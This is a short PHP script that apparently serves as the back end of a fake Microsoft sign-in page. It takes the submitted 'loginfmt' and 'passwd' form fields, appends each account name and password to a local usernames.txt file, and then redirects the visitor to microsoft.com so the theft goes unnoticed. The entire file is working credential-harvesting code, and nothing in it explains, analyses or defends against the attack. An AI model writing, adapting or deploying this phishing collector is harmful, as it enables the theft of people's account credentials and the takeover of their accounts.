<?php

file_put_contents("file:///C:/Users/tinky/Desktop/ttinkywinky45.github.io/usernames.txt", "Account: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://microsoft.com');
exit();
